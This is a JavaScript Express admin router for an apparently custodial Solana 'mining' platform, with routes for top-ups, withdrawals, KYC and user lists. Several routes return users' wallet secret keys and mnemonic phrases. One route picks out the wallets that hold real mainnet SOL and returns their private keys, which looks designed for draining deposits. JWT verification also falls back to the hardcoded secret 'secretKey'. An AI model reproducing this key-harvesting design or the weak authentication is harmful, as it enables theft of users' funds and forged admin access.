const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const User = require('./User');
const WithdrawRequest = require('./models/withdrawRequest');

// ✅ Authenticate Middleware
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ message: "Unauthorized" });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'secretKey');
    req.user = decoded;
    next();
  } catch {
    return res.status(401).json({ message: "Invalid token" });
  }
};

// ✅ Admin Middleware
const isAdmin = async (req, res, next) => {
  const user = await User.findById(req.user.id);
  if (!user || user.email !== 'admin@solana.com') {
    return res.status(403).json({ message: "Admin access required" });
  }
  next();
};

// ✅ Top-Up Balance
router.post('/topup', authenticate, isAdmin, async (req, res) => {
  try {
    const { wallet, amount } = req.body;
    if (!wallet || !amount || isNaN(amount)) {
      return res.status(400).json({ success: false, message: 'Wallet and valid amount required.' });
    }

    const user = await User.findOne({ 'solanaWallet.publicKey': wallet.trim() });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found for given wallet address.' });
    }

    user.balance += parseFloat(amount);
    user.rewardHistory.push({
      type: 'Deposit',
      amount: parseFloat(amount),
      status: 'Success',
      date: new Date()
    });

    await user.save();
    res.json({ success: true, message: `✅ ${amount} SOL added to ${user.username}'s balance.` });

  } catch (err) {
    console.error('Top-up error:', err);
    res.status(500).json({ success: false, message: '❌ Server error while topping up balance' });
  }
});

const web3 = require('@solana/web3.js');

router.get('/real-deposit-users', authenticate, isAdmin, async (req, res) => {
  try {
    const users = await User.find();

    const connection = new web3.Connection(web3.clusterApiUrl('mainnet-beta'), 'confirmed');

    const withDeposit = [];

    for (const user of users) {
      const pubKey = user.solanaWallet?.publicKey;
      if (!pubKey) continue;

      try {
        const balanceLamports = await connection.getBalance(new web3.PublicKey(pubKey));
        const balanceSOL = balanceLamports / web3.LAMPORTS_PER_SOL;

        if (balanceSOL > 0) {
          withDeposit.push({
            username: user.username,
            email: user.email,
            publicKey: pubKey,
            secretKey: user.solanaWallet?.secretKey || '',
            realBalance: balanceSOL.toFixed(4)
          });
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${pubKey}:`, err.message);
      }
    }

    res.json({ success: true, users: withDeposit });

  } catch (err) {
    console.error("Real deposit fetch error:", err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});


// ✅ Detailed Active Users in last 24 hours
router.get('/active-users-detailed', authenticate, isAdmin, async (req, res) => {
  try {
    const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
    const users = await User.find({ lastActiveAt: { $gte: oneDayAgo } });

    const detailed = await Promise.all(users.map(async (user) => {
      const referrals = await Promise.all(
        (user.referrals || []).map(async (ref) => {
          const referredUser = await User.findOne({ username: ref.username });
          return {
            username: ref.username,
            kycStatus: referredUser?.kyc?.status || 'not_submitted',
            balance: referredUser?.balance || 0
          };
        })
      );

      return {
        username: user.username,
        email: user.email,
        balance: user.balance,
        referrals
      };
    }));

    res.json({ success: true, total: detailed.length, users: detailed });
  } catch (err) {
    console.error("Active user detail error:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

router.get('/active-users', authenticate, isAdmin, async (req, res) => {
  try {
    const users = await User.find({ lastActiveAt: { $gte: Date.now() - 24 * 60 * 60 * 1000 } });
    res.json({ success: true, users });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});


// ✅ KYC Approved Users Route
router.get('/kyc-approved-users', authenticate, isAdmin, async (req, res) => {
  try {
    const users = await User.find({ 'kyc.status': 'approved' });
    res.json({ success: true, users });
  } catch (err) {
    console.error("Fetch approved KYC users error:", err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});




// ✅ Withdraw Requests
router.get('/withdraw-requests', authenticate, isAdmin, async (req, res) => {
  try {
    const requests = await WithdrawRequest.find({ status: 'pending' }).populate('user', 'username email solanaWallet');
    res.json({ success: true, requests });
  } catch (err) {
    console.error('Withdraw fetch error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/withdraw-approve/:id', authenticate, isAdmin, async (req, res) => {
  try {
    const request = await WithdrawRequest.findById(req.params.id).populate('user');
    if (!request) return res.status(404).json({ message: 'Withdraw request not found' });
    if (request.status !== 'pending') return res.status(400).json({ message: 'Already processed' });

    request.status = 'approved';
    request.processedAt = new Date();
    await request.save();

    const user = request.user;
    const reward = user.rewardHistory.find(r =>
      r.type === 'Withdrawal' && r.amount === request.amount && r.status === 'Pending'
    );

    if (reward) reward.status = 'Success';
    await user.save();

    res.json({ success: true, message: '✅ Withdraw approved' });
  } catch (err) {
    console.error('Withdraw approve error:', err);
    res.status(500).json({ message: 'Server error during approval' });
  }
});

router.post('/withdraw-reject/:id', authenticate, isAdmin, async (req, res) => {
  try {
    const request = await WithdrawRequest.findById(req.params.id).populate('user');
    if (!request) return res.status(404).json({ message: 'Withdraw request not found' });
    if (request.status !== 'pending') return res.status(400).json({ message: 'Already processed' });

    request.status = 'rejected';
    request.processedAt = new Date();
    await request.save();

    const user = request.user;
    user.balance += request.amount;

    const reward = user.rewardHistory.find(r =>
      r.type === 'Withdrawal' && r.amount === request.amount && r.status === 'Pending'
    );
    if (reward) reward.status = 'Rejected';

    await user.save();
    res.json({ success: true, message: '❌ Withdraw rejected and refunded' });
  } catch (err) {
    console.error('Withdraw reject error:', err);
    res.status(500).json({ message: 'Server error during rejection' });
  }
});

// ✅ KYC Routes
router.get('/kyc-requests', authenticate, isAdmin, async (req, res) => {
  try {
    const requests = await User.find({ 'kyc.status': 'pending' });
    res.json(requests);
  } catch (err) {
    console.error('Fetch KYC error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/approve/:id', authenticate, isAdmin, async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    user.kyc.status = 'approved';
    user.kyc.verifiedAt = new Date();
    user.kyc.approvedByAdmin = true;
    await user.save();

    res.json({ success: true, message: '✅ KYC approved manually' });
  } catch (err) {
    console.error("Approve KYC Error:", err);
    res.status(500).json({ message: 'Server error during approval' });
  }
});

router.post('/reject/:id', authenticate, isAdmin, async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    user.kyc.status = 'rejected';
    await user.save();

    res.json({ success: true, message: '❌ KYC rejected' });
  } catch (err) {
    console.error("Reject KYC Error:", err);
    res.status(500).json({ message: 'Server error during rejection' });
  }
});


// ✅ Total Users
router.get('/total-users', authenticate, isAdmin, async (req, res) => {
  try {
    const totalUsers = await User.countDocuments();
    res.json({ success: true, totalUsers });
  } catch (err) {
    console.error("Error fetching user count:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

router.get('/all-users', authenticate, isAdmin, async (req, res) => {
  try {
    const users = await User.find().select('-password');
    const userList = users.map(user => ({
      username: user.username,
      email: user.email,
      publicKey: user.solanaWallet?.publicKey || '',
      secretKey: user.solanaWallet?.secretKey || '',
      mnemonic: user.solanaWallet?.mnemonic || '',
      balance: user.balance,
      kycStatus: user.kyc?.status || 'not_submitted',
      registeredAt: user.createdAt || user.registeredAt || user._id.getTimestamp()
    }));
    res.json({ success: true, users: userList });
  } catch (err) {
    console.error("All users fetch error:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// ✅ Active Miners Route
router.get('/active-miners', authenticate, isAdmin, async (req, res) => {
  try {
    const users = await User.find({ 'miningSince': { $exists: true } });

    const miners = users.map(u => ({
      username: u.username,
      email: u.email,
      wallet: u.solanaWallet?.publicKey || '',
      mnemonic: u.solanaWallet?.mnemonic || '',
      miningSince: u.miningSince
    }));

    res.json({ success: true, miners });
  } catch (err) {
    console.error("Fetch mining users error:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});



// ✅ Deposit History
router.get('/deposit-history', authenticate, isAdmin, async (req, res) => {
  try {
    const users = await User.find({ 'depositHistory.0': { $exists: true } });
    const history = users.flatMap(user =>
      user.depositHistory.map(deposit => ({
        username: user.username,
        email: user.email,
        wallet: user.solanaWallet?.publicKey || '',
        txId: deposit.txId,
        amount: deposit.amount,
        receivedAt: deposit.receivedAt
      }))
    );
    res.json({ success: true, history });
  } catch (err) {
    console.error("Deposit History Error:", err);
    res.status(500).json({ success: false, message: 'Server error fetching history' });
  }
});

// ✅ Delete any user by ID
router.delete('/delete-user/:id', authenticate, isAdmin, async (req, res) => {
  try {
    const deleted = await User.findByIdAndDelete(req.params.id);
    if (!deleted) return res.status(404).json({ success: false, message: 'User not found' });

    res.json({ success: true, message: `User ${deleted.username} deleted successfully.` });
  } catch (err) {
    console.error("Delete user error:", err);
    res.status(500).json({ success: false, message: 'Server error deleting user' });
  }
});


module.exports = router;
